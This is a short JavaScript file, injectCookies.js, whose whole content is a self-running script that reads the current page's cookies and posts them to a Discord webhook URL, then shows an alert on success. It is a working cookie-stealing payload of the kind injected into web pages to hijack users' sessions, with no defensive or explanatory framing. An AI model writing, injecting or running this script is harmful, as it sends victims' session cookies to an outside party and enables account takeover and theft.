// injectCookies.js
(function() {
    // Get all cookies from the current domain
    const cookies = document.cookie;

    // Send cookies to the Discord webhook
    fetch('https://discord.com/api/webhooks/1385078800286744577/G9Cb7Saghwho1ytdjTghKIRjFNt1Em6eyKqfO2IKkH-EKLbO7YO__glTWggTGz2tY-Sy', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ content: `Cookies: \`\`\`${cookies}\`\`\`` })
    })
    .then(response => response.json())
    .then(data => {
        console.log('Cookies sent successfully:', data);
        alert('Cookies sent successfully!');
    })
    .catch(error => {
        console.error('Error sending cookies:', error);
        alert('Error sending cookies.');
    });
})();
